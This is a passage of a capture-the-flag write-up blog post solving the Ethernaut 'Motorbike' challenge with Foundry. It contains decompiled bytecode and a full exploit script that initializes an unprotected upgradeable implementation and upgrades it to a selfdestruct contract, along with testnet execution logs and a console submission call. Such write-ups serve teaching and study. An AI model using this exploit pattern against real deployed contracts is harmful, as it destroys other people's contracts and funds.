                            <span class="n">MEM</span><span class="p">[</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]]</span> <span class="o">=</span> <span class="mh">0x8c379a000000000000000000000000000000000000000000000000000000000</span><span class="p">;</span>
                            <span class="n">MEM</span><span class="p">[</span><span class="mi">4</span> <span class="o">+</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]]</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
                            <span class="nb">revert</span><span class="p">(</span><span class="n">Error</span><span class="p">(</span><span class="s">'Address: insufficient balance for call'</span><span class="p">));</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">MEM</span><span class="p">[</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]]</span> <span class="o">=</span> <span class="mh">0x8c379a000000000000000000000000000000000000000000000000000000000</span><span class="p">;</span>
                    <span class="n">MEM</span><span class="p">[</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
                    <span class="nb">revert</span><span class="p">(</span><span class="n">Error</span><span class="p">(</span><span class="s">'Address: call to non-contract'</span><span class="p">));</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">MEM</span><span class="p">[</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]]</span> <span class="o">=</span> <span class="mh">0x8c379a000000000000000000000000000000000000000000000000000000000</span><span class="p">;</span>
                <span class="n">MEM</span><span class="p">[</span><span class="mi">4</span> <span class="o">+</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]]</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
                <span class="nb">revert</span><span class="p">(</span><span class="n">Error</span><span class="p">(</span><span class="s">'Address: insufficient balance for call'</span><span class="p">));</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">RETURNDATACOPY</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">RETURNDATASIZE</span><span class="p">());</span>
            <span class="nb">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">RETURNDATASIZE</span><span class="p">());</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">RETURNDATACOPY</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">RETURNDATASIZE</span><span class="p">());</span>
        <span class="nb">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">RETURNDATASIZE</span><span class="p">());</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">owner</span><span class="p">()</span> <span class="k">public</span> <span class="n">nonPayable</span> <span class="p">{</span> 
    <span class="k">return</span> <span class="n">_owner</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="mh">0xd38def5b</span><span class="p">(</span><span class="kt">address</span> <span class="n">varg0</span><span class="p">,</span> <span class="kt">address</span> <span class="n">varg1</span><span class="p">)</span> <span class="k">public</span> <span class="n">nonPayable</span> <span class="p">{</span> 
    <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;=</span> <span class="mi">64</span><span class="p">);</span>
    <span class="k">return</span> <span class="kt">bool</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">_createInstance</span><span class="p">[</span><span class="n">varg0</span><span class="p">]).</span><span class="n">code</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.
</span>
<span class="k">function</span> <span class="n">__function_selector__</span><span class="p">(</span> <span class="n">function_selector</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span> 
    <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">fallback</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="mh">0x8da5cb5b</span> <span class="o">&gt;</span> <span class="n">function_selector</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="mh">0x715018a6</span> <span class="o">==</span> <span class="n">function_selector</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">renounceOwnership</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">require</span><span class="p">(</span><span class="mh">0x7726f776</span> <span class="o">==</span> <span class="n">function_selector</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">);</span>
            <span class="n">createInstance</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="mh">0x8da5cb5b</span> <span class="o">==</span> <span class="n">function_selector</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">owner</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="mh">0xd38def5b</span> <span class="o">==</span> <span class="n">function_selector</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">)</span> <span class="p">{</span>
        <span class="mh">0xd38def5b</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="mh">0xf2fde38b</span> <span class="o">==</span> <span class="n">function_selector</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">);</span>
        <span class="n">transferOwnership</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div><p>the Engine Contract is deployed first, and its address is then passed to the Motorbike Contract‚Äôs constructor for initialization.</p><p>While there is a standard formula for deriving the address of a deployed contract, Foundry‚Äôs <code class="language-plaintext highlighter-rouge">computeCreateAddress()</code> function makes it easy to calculate.</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint256</span> <span class="n">nonce</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">getNonce</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">));</span>
<span class="n">Motorbike</span> <span class="n">mb_</span> <span class="o">=</span> <span class="n">Motorbike</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">computeCreateAddress</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">),</span> <span class="n">nonce</span><span class="o">+</span><span class="mi">1</span><span class="p">)));</span>
<span class="n">Engine</span> <span class="n">eg_</span> <span class="o">=</span> <span class="n">Engine</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">computeCreateAddress</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">),</span> <span class="n">nonce</span><span class="p">));</span>
</code></pre></div></div><h2 id="executing-the-contract"> Executing the Contract <a href="#executing-the-contract">#</a></h2><p>Finally, simply execute the Contract.</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Sol</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="n">solve</span><span class="p">(</span><span class="n">ethernaut</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">eg_</span><span class="p">));</span>
<span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"Motorbike: "</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">mb_</span><span class="p">));</span>
<span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"Engine: "</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">eg_</span><span class="p">));</span>
<span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"code size: "</span><span class="p">,</span> <span class="n">_getCodeSize</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">eg_</span><span class="p">)));</span>
</code></pre></div></div><h2 id="complete-exploit-script"> Complete Exploit Script <a href="#complete-exploit-script">#</a></h2><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s">"../src/Ethernaut.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>

<span class="k">interface</span> <span class="n">Motorbike</span> <span class="p">{</span>
    <span class="k">function</span> <span class="n">_getAddressSlot</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">slot</span><span class="p">)</span> <span class="k">external</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
    <span class="k">function</span> <span class="n">_delegate</span><span class="p">(</span><span class="kt">address</span> <span class="n">implementation</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">interface</span> <span class="n">Engine</span> <span class="p">{</span>
    <span class="k">function</span> <span class="n">upgrader</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
    <span class="k">function</span> <span class="n">initialize</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
    <span class="k">function</span> <span class="n">upgradeToAndCall</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">contract</span> <span class="n">Ex</span> <span class="p">{</span>
    <span class="k">function</span> <span class="n">ex</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
        <span class="nb">selfdestruct</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="n">origin</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">contract</span> <span class="n">Sol</span> <span class="p">{</span>

    <span class="k">function</span> <span class="n">solve</span><span class="p">(</span><span class="n">Ethernaut</span> <span class="n">ethernaut</span><span class="p">,</span> <span class="kt">address</span> <span class="n">level</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_eg</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
        <span class="n">ethernaut</span><span class="p">.</span><span class="n">createLevelInstance</span><span class="p">(</span><span class="n">Level</span><span class="p">(</span><span class="n">level</span><span class="p">));</span>
        <span class="n">Engine</span><span class="p">(</span><span class="n">_eg</span><span class="p">).</span><span class="n">initialize</span><span class="p">();</span>
        <span class="n">Engine</span><span class="p">(</span><span class="n">_eg</span><span class="p">).</span><span class="n">upgradeToAndCall</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="k">new</span> <span class="n">Ex</span><span class="p">()),</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"ex()"</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">contract</span> <span class="n">MotorbikeSol</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
    <span class="n">Ethernaut</span> <span class="n">ethernaut</span> <span class="o">=</span> <span class="n">Ethernaut</span><span class="p">(</span><span class="mh">0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6</span><span class="p">);</span>
    <span class="n">Level</span> <span class="n">level</span> <span class="o">=</span> <span class="n">Level</span><span class="p">(</span><span class="mh">0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6</span><span class="p">);</span>

    <span class="k">function</span> <span class="n">_getCodeSize</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">assembly</span> <span class="p">{</span>
            <span class="n">size</span> <span class="o">:=</span> <span class="n">extcodesize</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>

        <span class="n">Sol</span> <span class="n">sol</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Sol</span><span class="p">();</span>
        <span class="kt">uint256</span> <span class="n">pk</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">parseBytes32</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">promptSecret</span><span class="p">(</span><span class="s">"private key"</span><span class="p">)));</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">signAndAttachDelegation</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">sol</span><span class="p">),</span> <span class="n">pk</span><span class="p">);</span>

        <span class="kt">uint256</span> <span class="n">nonce</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">getNonce</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">));</span>
        <span class="n">Motorbike</span> <span class="n">mb_</span> <span class="o">=</span> <span class="n">Motorbike</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">computeCreateAddress</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">),</span> <span class="n">nonce</span><span class="o">+</span><span class="mi">1</span><span class="p">)));</span>
        <span class="n">Engine</span> <span class="n">eg_</span> <span class="o">=</span> <span class="n">Engine</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">computeCreateAddress</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">),</span> <span class="n">nonce</span><span class="p">));</span>

        <span class="n">Sol</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="n">solve</span><span class="p">(</span><span class="n">ethernaut</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">eg_</span><span class="p">));</span>
        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"Motorbike: "</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">mb_</span><span class="p">));</span>
        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"Engine: "</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">eg_</span><span class="p">));</span>
        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"code size: "</span><span class="p">,</span> <span class="n">_getCodeSize</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">eg_</span><span class="p">)));</span>

        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>The complete exploit code is as follows, and executing it yields the following values.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>forge script script/MotorbikeSol.sol:MotorbikeSol <span class="nt">--account</span> mingw <span class="nt">--sender</span> 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 <span class="nt">--rpc-url</span> sepolia <span class="nt">--skip-simulation</span> <span class="nt">--isolate</span> <span class="nt">--broadcast</span>
<span class="o">[</span>‚†ä] Compiling...
No files changed, compilation skipped
private key: <span class="o">[</span>hidden]
Script ran successfully.

<span class="o">==</span> Logs <span class="o">==</span>
  Motorbike:  0xb6Ee323Edf5e4091239234cA66E73ec0eAc7F3Ff
  Engine:  0x8824F3ce858C01E200bF0AA8381d18393C154eAB
  code size:  0

SKIPPING ON CHAIN SIMULATION.
Enter keystore password:

<span class="c">##### sepolia</span>
‚úÖ  <span class="o">[</span>Success] Hash: 0xe664e9415d354643dffb4796de37f7c6df4db23667dfcfbebc18c4d63e2a6b9b
Contract Address: 0xeD2427fef1Cbb2889662DCE61250c0D4aB5CB52e
Block: 10065934
Paid: 0.0006675423286207 ETH <span class="o">(</span>330850 gas <span class="k">*</span> 2.017658542 gwei<span class="o">)</span>

<span class="c">##### sepolia</span>
‚úÖ  <span class="o">[</span>Success] Hash: 0x2c3881cd7e96240ed1b563a9124ab3477beec32430e27c11b925afdad6329f28
Block: 10065935
Paid: 0.0014929189030595 ETH <span class="o">(</span>754460 gas <span class="k">*</span> 1.978791325 gwei<span class="o">)</span>

‚úÖ Sequence <span class="c">#1 on sepolia | Total Paid: 0.0021604612316802 ETH (1085310 gas * avg 1.998224933 gwei)</span>

<span class="o">==========================</span>

ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.
</code></pre></div></div><p>I can confirm the addresses of the Motorbike and Engine Contracts, and verify that the Engine contract‚Äôs code size is 0.</p><h2 id="ethernaut-submission"> Ethernaut Submission <a href="#ethernaut-submission">#</a></h2><p>Now, we need to verify the solution on the Ethernaut site.</p><p>If we verify by simply clicking the ‚ÄúSubmit Instance‚Äù button, a different contract‚Äînot the one executed in Foundry‚Äîwill be submitted.</p><p>Therefore, we must manually submit using the Motorbike Contract address obtained from the Foundry output.</p><p>Go to the Motorbike challenge page, press F12, and execute the following command in the console tab.</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">ethereum</span><span class="p">.</span><span class="nx">request</span><span class="p">({</span>
  <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">eth_sendTransaction</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">params</span><span class="p">:</span> <span class="p">[{</span>
    <span class="na">from</span><span class="p">:</span> <span class="nx">player</span><span class="p">,</span>
    <span class="na">to</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">data</span><span class="p">:</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeFunctionCall</span><span class="p">(</span>
      <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">submitLevelInstance</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">function</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">inputs</span><span class="p">:</span> <span class="p">[{</span><span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">address</span><span class="dl">'</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">_instance</span><span class="dl">'</span><span class="p">}]</span>
      <span class="p">},</span>
      <span class="p">[</span><span class="dl">'</span><span class="s1">0xb6Ee323Edf5e4091239234cA66E73ec0eAc7F3Ff</span><span class="dl">'</span><span class="p">]</span>
    <span class="p">),</span>
    <span class="na">gas</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0x200000</span><span class="dl">'</span>
  <span class="p">}]</span>
<span class="p">})</span>
</code></pre></div></div><p>This code directly executes the <code class="language-plaintext highlighter-rouge">submitLevelInstance()</code> function using the MetaMask API. Upon execution, the submission is completed via MetaMask interaction, and if you refresh the page</p><p><img src="https://0o3q.github.io/images/2026-01-17-Motorbike/solve.png" alt="Image solve" /></p><p>We can confirm that the challenge has been solved.</p><h2 id="revoking-the-delegation"> Revoking the Delegation <a href="#revoking-the-delegation">#</a></h2><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>cast code 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 <span class="nt">--rpc-url</span> sepolia
0xef0100ed2427fef1cbb2889662dce61250c0d4ab5cb52e
</code></pre></div></div><p>Inspecting the wallet address reveals that the code delegation is still active.</p><p>This must be revoked, as it could be triggered when Ether is received.</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>

<span class="k">contract</span> <span class="n">MotorbikeSol</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>

    <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>

        <span class="kt">uint256</span> <span class="n">pk</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">parseBytes32</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">promptSecret</span><span class="p">(</span><span class="s">"private key"</span><span class="p">)));</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">signAndAttachDelegation</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">pk</span><span class="p">);</span>

        <span class="k">payable</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>The process is similar to the solution steps. However, since the script will not execute without a transaction to broadcast, I triggered a dummy transaction using <code class="language-plaintext highlighter-rouge">payable(msg.sender).transfer(0)</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>cast code 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 <span class="nt">--rpc-url</span> sepolia
0x
</code></pre></div></div></section><section><nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/2026/01/09/puzzle-wallet"><div class="nav-arrow">Previous</div><span class="post-title">[Ethernaut] 24.Puzzle Wallet</span> </a> <a class="post-nav-item post-nav-next" href="/2026/01/19/doubleentrypoint"><div class="nav-arrow">Next</div><span class="post-title">[Ethernaut] 26.DoubleEntryPoint</span> </a></nav></section></main><script> function setTheme(theme) { if (theme === "dark") { document.documentElement.setAttribute('data-theme', 'dark'); window.localStorage.setItem('theme', 'dark'); document.getElementById("theme-toggle").classList.add('sun'); document.getElementById("theme-toggle").classList.remove('moon'); } else { document.documentElement.setAttribute('data-theme', 'light'); window.localStorage.setItem('theme', 'light'); document.getElementById("theme-toggle").classList.add('moon'); document.getElementById("theme-toggle").classList.remove('sun'); } } let theme = localStorage.getItem('theme'); theme = theme || (window.matchMedia ? window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light' : 'light'); setTheme(theme); function modeSwitcher() { let currentMode = document.documentElement.getAttribute('data-theme'); if (currentMode === "dark") { setTheme('light'); } else { setTheme('dark'); } } </script></body><footer class="social-footer"><div class="social-footer-icons"> <a href="https://github.com/0o3q" title="Github profile" target="_blank" rel="noopener noreferrer"><i class="fa fa-github" aria-hidden="true"></i></a> <a href="https://0o3q.github.io/atom.xml" title="Feed RSS" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss" aria-hidden="true"></i></a> <a href="https://github.com/0o3q/0o3q.github.io" title="Browse the code" target="_blank" rel="noopener noreferrer"><i class="fa fa-code" aria-hidden="true"></i></a></div></footer></html>
